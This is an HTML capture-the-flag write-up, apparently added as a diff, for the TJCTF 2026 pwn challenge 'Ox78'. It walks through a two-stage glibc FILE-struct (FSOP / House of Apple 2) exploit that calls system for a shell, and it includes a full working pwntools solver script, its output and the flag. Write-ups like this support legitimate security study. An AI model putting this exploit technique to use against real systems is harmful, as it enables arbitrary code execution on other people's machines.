@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+  <meta charset="utf-8">
+  <title>Ox78 - Writeup</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="CTF Writeup">
+  <meta name="author" content="Cyber Saguaros">
+
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400|Josefin+Sans:300,400,600,700">
+  <link rel="stylesheet" href="/plugins/bootstrap/bootstrap.min.css">
+  <link rel="stylesheet" href="/plugins/themefisher-font/themefisher-font.min.css">
+  <link rel="stylesheet" href="/scss/style.min.css" media="screen">
+
+  <style>
+    body {
+      background:
+        radial-gradient(circle at top, rgba(203, 166, 247, 0.18), transparent 34%),
+        linear-gradient(180deg, #1e1e2e 0%, #181825 100%);
+      color: #cdd6f4;
+      font-family: 'Droid Serif', 'Josefin Sans', sans-serif;
+    }
+
+    header.navigation {
+      background-color: #181825;
+    }
+
+    /* Force navbar/link colors to match site header even if external CSS didn't load */
+    .navigation, .navbar {
+      background-color: #181825 !important;
+    }
+    .navbar-brand, .nav-link {
+      color: #cdd6f4 !important;
+    }
+    .nav-link:hover, .navbar-brand:hover {
+      color: #d8bafc !important;
+    }
+
+    .writeup-container {
+      max-width: 900px;
+      margin: 3rem auto;
+      background: rgba(24, 24, 37, 0.94);
+      border: 1px solid rgba(203, 166, 247, 0.18);
+      border-radius: 16px;
+      padding: 2rem;
+      box-shadow: 0 16px 50px rgba(0, 0, 0, 0.28);
+    }
+
+    .markdown-content {
+      color: rgba(205, 214, 244, 0.86);
+      line-height: 1.8;
+    }
+
+    .markdown-content h1 { color: #f5e0dc; font-size: 2.2rem; margin: 0 0 1rem; line-height: 1.2; border-bottom: 2px solid rgba(203,166,247,0.2); padding-bottom:1rem; }
+    .markdown-content h2 { color: #f5e0dc; font-size: 1.6rem; margin: 2rem 0 1rem; border-bottom: 1px solid rgba(203,166,247,0.12); padding-bottom:0.5rem; }
+    .markdown-content h3 { color: #cba6f7; font-size: 1.3rem; margin: 1.5rem 0 0.8rem; }
+    .markdown-content p { margin-bottom: 1rem; }
+    .markdown-content code { background: rgba(0,0,0,0.3); color: #94e2d5; padding:0.2rem 0.5rem; border-radius:4px; font-family: 'Courier New', monospace; }
+    .markdown-content pre { background: rgba(0,0,0,0.4); border-left: 3px solid #cba6f7; padding:1rem; border-radius:6px; overflow-x:auto; margin:1rem 0; }
+    .markdown-content pre code { background:none; color:#89b4fa; padding:0; }
+    .markdown-content blockquote { border-left:4px solid #cba6f7; padding-left:1rem; color:rgba(205,214,244,0.76); font-style:italic; }
+    .markdown-content table { border-collapse: collapse; width:100%; margin:1rem 0; }
+    .markdown-content table th, .markdown-content table td { border:1px solid rgba(203,166,247,0.2); padding:0.75rem; text-align:left; }
+    .markdown-content table th { background: rgba(203,166,247,0.1); color:#f5e0dc; font-weight:700; }
+
+    footer.footer { background-color:#1e1e2e; color:#cdd6f4; padding:2rem 1rem; text-align:center; margin-top:3rem; border-top:1px solid rgba(203,166,247,0.12); }
+  </style>
+</head>
+
+<body>
+  <header class="navigation" style="background-color: #1e1e2e;">
+    <div class="container">
+      <nav class="navbar navbar-expand-lg navbar-dark">
+        <a class="navbar-brand" href="/">Cyber Saguaros</a>
+        <div class="collapse navbar-collapse">
+          <ul class="navbar-nav ml-auto">
+            <li class="nav-item"><a class="nav-link" href="/contact/">Contact</a></li>
+            <li class="nav-item"><a class="nav-link" href="/calendar/">Calendar</a></li>
+            <li class="nav-item"><a class="nav-link" href="/presentations/">Presentations</a></li>
+            <li class="nav-item"><a class="nav-link" href="/writeups/">Writeups</a></li>
+          </ul>
+        </div>
+      </nav>
+    </div>
+  </header>
+
+  <main>
+    <div class="container">
+      <a href="/writeups/" class="back-link">← Back to Writeups</a>
+      <div class="writeup-container">
+        <div class="markdown-content">
+          <h1 id="ox78">Ox78</h1>
+<p><strong>Author:</strong> Jordan Lanham
+<strong>Event:</strong> TJCTF 2026
+<strong>Category:</strong> pwn
+<strong>Date:</strong> May 15, 2026
+<strong>Read Time:</strong> 9 minutes</p>
+<hr>
+<h2 id="overview">Overview</h2>
+<p>A medium-difficulty FSOP (File-Stream-Oriented Programming) challenge.  The
+binary opens <code>/tmp/test.txt</code>, prints both a heap leak (the <code>FILE *</code> itself) and
+a libc leak, then calls <code>read(0, fp, 0x78)</code> -- letting us overwrite the first
+0x78 bytes of the FILE struct -- followed by <code>fread(testbuf, 1, 0x78, fp)</code>.
+A &quot;prevent_fsop&quot; function tries to detect tampering but the check is broken
+(compares a value with itself), so it never actually trips.</p>
+<p>We chain the FILE-struct corruption into the <code>fread</code> -&gt; <code>_IO_file_underflow</code>
+primitive (which calls <code>read(_fileno, _IO_buf_base, _IO_buf_end - _IO_buf_base)</code>
+with attacker-controlled fields) to write a SECOND attacker-controlled buffer
+INTO the FILE struct itself.  That second write installs a <code>_IO_wfile_jumps</code>
+vtable plus a fake <code>_wide_data</code> whose <code>_wide_vtable-&gt;__doallocate</code> points at
+<code>system</code>.  At exit, <code>_IO_flush_all</code> walks the chain to our fp, calls
+<code>_IO_wfile_overflow</code> -&gt; <code>_IO_wdoallocbuf</code> -&gt; <code>system(fp)</code> -- and since fp&#39;s
+first bytes were rewritten to <code>&quot; sh\0&quot;</code>, we get a shell.</p>
+<h2 id="challenge-description">Challenge Description</h2>
+<blockquote>
+<p>Oh the joys of file structs...
+nc tjc.tf 31378</p>
+</blockquote>
+<p><strong>Files provided:</strong> <code>Ox78</code>, <code>libc.so.6</code> (glibc 2.34), <code>ld-linux-x86-64.so.2</code>, <code>Dockerfile</code>
+<strong>Endpoints:</strong> <code>nc tjc.tf 31378</code></p>
+<h2 id="initial-analysis">Initial Analysis</h2>
+<p><code>checksec Ox78</code>:</p>
+<pre><code>Arch:       amd64-64-little
+RELRO:      Full RELRO
+Stack:      No canary found
+NX:         NX enabled
+PIE:        PIE enabled
+SHSTK:      Enabled
+IBT:        Enabled
+</code></pre>
+<p>Full RELRO + IBT + SHSTK rules out GOT overwrite and classic ROP / JOP gadget
+abuse; we must stay within legitimate libio control flow.</p>
+<p>Decompiled <code>Ox78()</code>:</p>
+<pre><code class="language-c">create_test_file();                              // open/close /tmp/test.txt
+testbuf = malloc(0x78);
+fp = fopen(&quot;/tmp/test.txt&quot;, &quot;r&quot;);
+puts(prompt);
+printf(&quot;Here&#39;s the address of the File Structure: 0x%llx\n&quot;, fp);
+printf(&quot;...libc leak as well: %p\n\n&quot;, puts_got_value);   // = libc.puts
+read(0, fp, 0x78);                               // ATTACKER WRITE: first 0x78 of fp
+prevent_fsop();
+fread(testbuf, 1, 0x78, fp);                     // TRIGGERS the corrupted FILE
+prevent_fsop();
+return 0;
+</code></pre>
+<p><code>prevent_fsop</code> (decompiled):</p>
+<pre><code class="language-c">void prevent_fsop() {
+    void *wd  = fp-&gt;_wide_data;         // first read
+    void *vt  = fp-&gt;vtable;
+    void *wd2 = fp-&gt;_wide_data;         // second read, same address
+    void *vt2 = fp-&gt;vtable;
+    if (wd != wd2 || vt != vt2) {       // can only differ across threads / signals
+        *(int *)0 = 1;                  // NULL deref -&gt; SIGSEGV
+    }
+    fp-&gt;_chain = 0;                     // &lt;-- THIS is the real effect
+}
+</code></pre>
+<p>The <code>_wide_data</code> and <code>vtable</code> checks always pass (they re-read the same memory
+back-to-back), but the side-effect that matters is <code>fp-&gt;_chain = 0</code>.  Iteration
+of <code>_IO_list_all</code> at exit therefore stops AT fp -- standard &quot;flush stdout last&quot;
+House of Apple chains are blocked, but our fp is still the FIRST file in the
+list so it IS visited.</p>
+<p><code>_IO_FILE_plus</code> layout (glibc 2.34):</p>
+<table>
+<thead>
+<tr>
+<th>offset</th>
+<th>field</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0x00</td>
+<td><code>_flags</code></td>
+</tr>
+<tr>
+<td>0x08</td>
+<td><code>_IO_read_ptr</code></td>
+</tr>
+<tr>
+<td>0x10</td>
+<td><code>_IO_read_end</code></td>
+</tr>
+<tr>
+<td>0x18</td>
+<td><code>_IO_read_base</code></td>
+</tr>
+<tr>
+<td>0x20</td>
+<td><code>_IO_write_base</code></td>
+</tr>
+<tr>
+<td>0x28</td>
+<td><code>_IO_write_ptr</code></td>
+</tr>
+<tr>
+<td>0x30</td>
+<td><code>_IO_write_end</code></td>
+</tr>
+<tr>
+<td>0x38</td>
+<td><code>_IO_buf_base</code></td>
+</tr>
+<tr>
+<td>0x40</td>
+<td><code>_IO_buf_end</code></td>
+</tr>
+<tr>
+<td>0x48..0x67</td>
+<td>various</td>
+</tr>
+<tr>
+<td>0x68</td>
+<td><code>_chain</code></td>
+</tr>
+<tr>
+<td>0x70</td>
+<td><code>_fileno</code></td>
+</tr>
+<tr>
+<td>0x74</td>
+<td><code>_flags2</code></td>
+</tr>
+<tr>
+<td>0x78</td>
+<td><code>_old_offset</code></td>
+</tr>
+<tr>
+<td>...</td>
+<td></td>
+</tr>
+<tr>
+<td>0x88</td>
+<td><code>_lock</code></td>
+</tr>
+<tr>
+<td>0xa0</td>
+<td><code>_wide_data</code></td>
+</tr>
+<tr>
+<td>0xd8</td>
+<td><code>vtable</code></td>
+</tr>
+</tbody></table>
+<p>Our 0x78-byte read covers offsets <code>0..0x77</code> -- everything up to but excluding
+<code>_old_offset</code>.  In particular: <code>_IO_buf_base</code>, <code>_IO_buf_end</code>, <code>_fileno</code>,
+<code>_chain</code> all within range; <code>_wide_data</code> and <code>vtable</code> NOT directly writable.
+We need a secondary write to reach those.</p>
+<p><code>fopen()</code> allocates a <code>locked_FILE</code> struct: <code>_IO_FILE_plus</code> + <code>_IO_lock_t</code> +
+<code>_IO_wide_data</code>, contiguously.  That means <code>fp + 0xe8</code> is the start of fp&#39;s
+own <code>_wide_data</code> struct (in heap memory adjacent to fp).  We use that as the
+known address of OUR fake wide_data.</p>
+<h2 id="solution-approach">Solution Approach</h2>
+<h3 id="step-1-confirm-the-leaks">Step 1: Confirm the leaks</h3>
+<pre><code>I&#39;m trying to test my FSOP prevention mechanism so I can share it with my coworkers ...
+Here&#39;s the address of the File Structure: 0x55a3...
+I&#39;m pretty confident you can&#39;t break out of this, ... libc leak as well: 0x7f38e19c3ed0
+</code></pre>
+<p>The libc leak is <code>puts</code>; subtract <code>libc.sym[&#39;puts&#39;]</code> (= 0x84ed0) to get libc
+base.  The heap leak gives us the FILE pointer (and therefore <code>fp + 0xe8</code>, the
+adjacent <code>_IO_wide_data</code> slot, for free).</p>
+<h3 id="step-2-stage-1----corrupt-file-to-redirect-freads-underflow-at-fp-itself">Step 2: Stage 1 -- corrupt FILE to redirect fread&#39;s underflow at FP itself</h3>
+<p>After <code>read(0, fp, 0x78)</code>, the corrupted fields drive <code>fread</code> which calls
+<code>_IO_xsgetn</code> -&gt; <code>_IO_file_underflow</code>:</p>
+<pre><code class="language-c">fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;
+fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;
+fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end = fp-&gt;_IO_buf_base;
+count = _IO_SYSREAD(fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);
+fp-&gt;_IO_read_end += count;
+return *(unsigned char *)fp-&gt;_IO_read_ptr;
+</code></pre>
+<p>i.e. <code>read(_fileno, _IO_buf_base, _IO_buf_end - _IO_buf_base)</code>.  With
+<code>_fileno = 0</code> and <code>_IO_buf_base = fp</code>, <code>_IO_buf_end = fp + 0x1d0</code>, the
+underflow&#39;s <code>read</code> syscall <strong>OVERWRITES the entire FILE struct AND the adjacent
+locked_FILE.wd</strong>.  That&#39;s the primary primitive.</p>
+<p>There are two <code>_flags</code> constraints to navigate:</p>
+<ol>
+<li><code>fread</code> calls <code>CHECK_FILE(fp, 0)</code> which enforces
+<code>(_flags &amp; _IO_MAGIC_MASK) == _IO_MAGIC</code>, i.e. high 16 bits = <code>0xfbad</code>.</li>
+<li><code>_IO_file_underflow</code> checks <code>_flags &amp; _IO_NO_READS == 0</code>.</li>
+</ol>
+<p>So stage-1&#39;s <code>_flags = 0xfbad0000</code> clears all the read/no_writes/unbuffered
+bits AND keeps the magic.</p>
+<h3 id="step-3-stage-2----the-payload-swallowed-by-the-underflow-read">Step 3: Stage 2 -- the payload swallowed by the underflow read</h3>
+<p>After underflow&#39;s syscall returns, glibc does <code>fp-&gt;_IO_read_end += count</code>.
+Crucially, glibc 2.34&#39;s <code>_IO_new_file_underflow</code> does NOT cache <code>_IO_buf_base</code>
+in a local before this addition: it re-reads <code>fp-&gt;_IO_buf_base</code> from memory
+that we JUST overwrote.  And it ends with <code>return *(unsigned char *)fp-&gt;_IO_read_ptr</code>,
+again post-overwrite.  So our stage-2 must place a <strong>safe readable value</strong> in
+<code>fp-&gt;_IO_read_ptr</code> (offset 0x08) -- or fread crashes immediately when it
+dereferences NULL.  I use <code>libc.address</code> (start of libc) for that, since
+the ELF header is always readable.</p>
+<p>The full stage-2 layout (0x1d0 bytes, written by the underflow into fp+0..0x1cf):</p>
+<pre><code>offset 0x00  : &quot;_flags&quot;  = b&quot; sh\0&quot;     (so system(fp) -&gt; system(&quot; sh&quot;) -&gt; /bin/sh)
+offset 0x08  : _IO_read_ptr  = libc.address    (safe readable)
+offset 0x10  : _IO_read_end  = libc.address + 0x100
+offset 0x20  : _IO_write_base = 0
+offset 0x28  : _IO_write_ptr  = 1               (&gt;base, so _IO_flush_all triggers our fp)
+offset 0x88  : _lock = fp + 0xe0                (point at zeroed inline lock)
+offset 0xa0  : _wide_data    = fp + 0xe8       (= adjacent locked_FILE.wd)
+offset 0xc0  : _mode = 0                        (byte mode, so flush_all checks write_ptr)
+offset 0xd8  : vtable        = _IO_wfile_jumps
+offset 0xe0  : (locked_FILE.lock, zeroed)
+offset 0xe8  : start of wd struct
+  wd[0x18]   = 0   (write_base)               # so wfile_overflow takes the alloc branch
+  wd[0x30]   = 0   (buf_base)                  # so wdoallocbuf actually calls __doallocate
+  wd[0x68]   = system                          # fake_vtable[__doallocate slot]
+offset 0x1c8 : wd-&gt;_wide_vtable = fp + 0xe8    (the wd itself acts as the fake vtable)
+</code></pre>
+<p>The fake vtable IS the wd region: setting <code>wd-&gt;_wide_vtable = wd_addr</code> means
+fake_vtable + 0x68 lands at <code>wd[0x68]</code>, which we set to <code>system</code>.</p>
+<h3 id="step-4-exit-time-control-flow">Step 4: Exit-time control flow</h3>
+<pre><code>exit -&gt; _IO_cleanup -&gt; _IO_flush_all_lockp
+  -&gt; for our fp: _mode&lt;=0 and write_ptr &gt; write_base -&gt; _IO_OVERFLOW(fp,EOF)
+     -&gt; validate fp-&gt;vtable: _IO_wfile_jumps is in __libc_IO_vtables -&gt; ok
+     -&gt; _IO_wfile_overflow(fp, EOF)
+        -&gt; wd-&gt;write_base == NULL || flags &amp; CURRENTLY_PUTTING == 0  -&gt; taken
+        -&gt; wd-&gt;buf_base == NULL -&gt; call _IO_wdoallocbuf(fp)
+           -&gt; rax = fp-&gt;_wide_data  (= fp + 0xe8)
+           -&gt; rax = rax-&gt;_wide_vtable  (= fp + 0xe8 again)
+           -&gt; call *(rax + 0x68)  = system, with rdi = fp
+              -&gt; system(&quot; sh&quot;) -&gt; /bin/sh
+</code></pre>
+<p><code>fp[0..3] = &quot; sh\0&quot;</code> -&gt; <code>_flags</code> byte view = <code>0x00687320</code>.  Verification:
+<code>&amp; _IO_NO_WRITES (0x8)</code> = 0; <code>&amp; _IO_UNBUFFERED (0x2)</code> = 0; <code>&amp; _IO_CURRENTLY_PUTTING (0x800)</code> = 0.
+All required bits clean.  <code>system</code> reads the string at fp: bytes <code>0x20, 0x73, 0x68, 0x00</code>
+= <code>&quot; sh&quot;</code> followed by NUL.  /bin/sh accepts leading whitespace -&gt; drops to interactive shell.</p>
+<h2 id="code--exploit">Code / Exploit</h2>
+<p>Full working solver: <code>_workspace/sol_ox78_v3.py</code></p>
+<pre><code class="language-python">#!/usr/bin/env python3
+from pwn import *
+import struct, time
+
+HOST, PORT = &#39;tjc.tf&#39;, 31378
+libc = ELF(&#39;files/ox78__libc.so.6&#39;, checksec=False)
+
+io = remote(HOST, PORT)
+io.recvuntil(b&#39;right?\n\n&#39;)
+fp_addr   = int(io.recvuntil(b&#39;\n&#39;).strip().split(b&#39;0x&#39;)[1], 16)
+puts_libc = int(io.recvuntil(b&#39;\n&#39;).strip().split(b&#39;0x&#39;)[1], 16)
+libc.address = puts_libc - libc.symbols[&#39;puts&#39;]
+
+wfile_jumps = libc.symbols[&#39;_IO_wfile_jumps&#39;]
+system      = libc.symbols[&#39;system&#39;]
+
+# Stage 1: read(0, fp, 0x78)
+stage1  = p64(0xfbad0000)             # _flags: magic, no bad bits
+stage1 += p64(0)*6                    # read/write ptrs/bases
+stage1 += p64(fp_addr + 0x00)         # _IO_buf_base = fp (underflow target)
+stage1 += p64(fp_addr + 0x1d0)        # _IO_buf_end
+stage1 += p64(0)*5                    # save/backup/markers/chain
+stage1 += p32(0) + p32(0)             # _fileno=0 (stdin), _flags2=0
+assert len(stage1) == 0x78
+io.send(stage1)
+
+# Stage 2: 0x1d0 bytes swallowed by fread -&gt; _IO_file_underflow -&gt; read(0, fp, 0x1d0)
+wd_addr   = fp_addr + 0xe8
+lock_addr = fp_addr + 0xe0
+stage2 = bytearray(b&#39;\x00&#39; * 0x1d0)
+struct.pack_into(&#39;&lt;4s&#39;, stage2, 0x00, b&#39; sh\x00&#39;)               # _flags + system arg
+struct.pack_into(&#39;&lt;Q&#39;,  stage2, 0x08, libc.address)              # _IO_read_ptr: safe deref
+struct.pack_into(&#39;&lt;Q&#39;,  stage2, 0x10, libc.address + 0x100)
+struct.pack_into(&#39;&lt;Q&#39;,  stage2, 0x28, 1)                         # write_ptr &gt; write_base
+struct.pack_into(&#39;&lt;Q&#39;,  stage2, 0x88, lock_addr)                 # _lock -&gt; fp+0xe0
+struct.pack_into(&#39;&lt;Q&#39;,  stage2, 0xa0, wd_addr)                   # _wide_data -&gt; fp+0xe8
+struct.pack_into(&#39;&lt;Q&#39;,  stage2, 0xd8, wfile_jumps)               # vtable
+struct.pack_into(&#39;&lt;Q&#39;,  stage2, 0xe8 + 0x68, system)             # fake_vtable[__doallocate]
+struct.pack_into(&#39;&lt;Q&#39;,  stage2, 0x1c8, wd_addr)                  # wd-&gt;_wide_vtable
+io.send(bytes(stage2))
+
+time.sleep(0.5)
+io.sendline(b&#39;cat /flag.txt; cat /app/flag.txt; cat /srv/app/flag.txt&#39;)
+print(io.recvall(timeout=4).decode(&#39;latin-1&#39;))
+io.close()
+</code></pre>
+<p>Run:</p>
+<pre><code>$ python3 sol_ox78_v3.py
+[+] fp        = 0x555578a31320
+[+] libc.base = 0x7b939ecef000
+SHELLOK
+uid=1000(ubuntu) gid=1000(ubuntu)
+tjctf{d0uBl3_FSoP_1s_fUN_29391}
+</code></pre>
+<h2 id="technical-details">Technical Details</h2>
+<ul>
+<li><strong>Vulnerability class:</strong> FSOP / <code>_IO_FILE</code> struct overwrite</li>
+<li><strong>Primary primitive:</strong> <code>read(0, fp, 0x78)</code> -- raw stomp on FILE fields 0..0x77.</li>
+<li><strong>Secondary primitive:</strong> <code>fread(...,fp)</code> -&gt; <code>_IO_file_underflow</code> whose
+<code>read(_fileno, _IO_buf_base, len)</code> is a 2nd attacker-controlled write reaching
+<code>_wide_data</code> (offset 0xa0), <code>vtable</code> (offset 0xd8), and the adjacent
+<code>locked_FILE.wd</code> struct (fp+0xe8..fp+0x1c7).</li>
+<li><strong>Vtable bypass:</strong> main <code>vtable</code> validated against <code>__libc_IO_vtables</code>, so we
+use <code>_IO_wfile_jumps</code> (legitimate).  <code>_wide_vtable</code> is NOT validated -- House
+of Apple 2 reaches <code>system</code> through <code>_IO_wdoallocbuf</code> calling
+<code>wide_data-&gt;_wide_vtable-&gt;__doallocate(fp)</code>.</li>
+<li><strong>Critical pitfall:</strong> glibc 2.34&#39;s <code>_IO_new_file_underflow</code> re-reads
+<code>fp-&gt;_IO_buf_base</code>, <code>fp-&gt;_IO_read_end</code>, and dereferences <code>fp-&gt;_IO_read_ptr</code>
+AFTER the SYSREAD overwrites the FILE.  Your stage-2 MUST place a valid
+readable pointer at <code>fp-&gt;_IO_read_ptr</code> (offset 0x08) or the underflow crashes
+on its own return value.</li>
+</ul>
+<h2 id="key-insights">Key Insights</h2>
+<ul>
+<li>&quot;Mitigation&quot; functions that re-read the same memory twice for &quot;tamper
+detection&quot; check absolutely nothing: read it once, write it, read it again
+-- both reads see the same (new) value.  The check has to either hash to
+write-protected storage or read from a side-channel.</li>
+<li><code>fopen</code>&#39;s <code>locked_FILE</code> allocates <code>_IO_FILE_plus + _IO_lock_t + _IO_wide_data</code>
+in one chunk -- knowing the FILE pointer gives you the wide_data location
+for free.</li>
+<li>House of Apple 2 stays viable in glibc 2.34/2.42 because <code>_wide_vtable</code> is
+not vtable-checked.</li>
+<li>When the underflow re-reads fields AFTER the SYSREAD-overwrite, you must
+plant valid pointers at <em>both</em> the buffer-management fields AND the post-
+read state fields (<code>_IO_read_ptr</code>, <code>_IO_read_end</code>) of stage-2.</li>
+<li><code>system(fp)</code> needs <code>fp[0..3]</code> to (a) pass any <code>_flags</code> bit-checks on the
+exit-flush path, and (b) be the start of a valid shell command.  <code>&quot; sh\0&quot;</code>
+satisfies both (UNBUFFERED/NO_WRITES/CURRENTLY_PUTTING all clear, and <code>sh</code>
+accepts leading whitespace).</li>
+</ul>
+<h2 id="the-flag">The Flag</h2>
+<pre><code>tjctf{d0uBl3_FSoP_1s_fUN_29391}
+</code></pre>
+<h2 id="resources">Resources</h2>
+<ul>
+<li><a href="https://github.com/bsauce/pwn-tutorial">House of Apple 2 - bsauce (CN)</a></li>
+<li><a href="https://elixir.bootlin.com/glibc/glibc-2.34/source/libio/fileops.c">glibc 2.34 _IO_new_file_underflow source</a></li>
+<li><a href="https://elixir.bootlin.com/glibc/glibc-2.34/source/libio/wfileops.c">glibc 2.34 _IO_wfile_overflow source</a></li>
+<li><a href="https://github.com/scwuaptx/CTF/tree/master/2022-writeup/FSOP">angelboy - FSOP slides</a></li>
+<li><a href="https://github.com/shellphish/how2heap">how2heap (shellphish)</a></li>
+<li><a href="https://github.com/redpwn/jail">pwn.red/jail challenge runtime</a></li>
+</ul>
+
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="container">
+      <p>&copy; 2024-2026 Cyber Saguaros. All rights reserved.</p>
+    </div>
+  </footer>
+
+  <script src="/plugins/jquery/jquery.js"></script>
+  <script src="/plugins/bootstrap/bootstrap.min.js"></script>
+</body>
+</html>
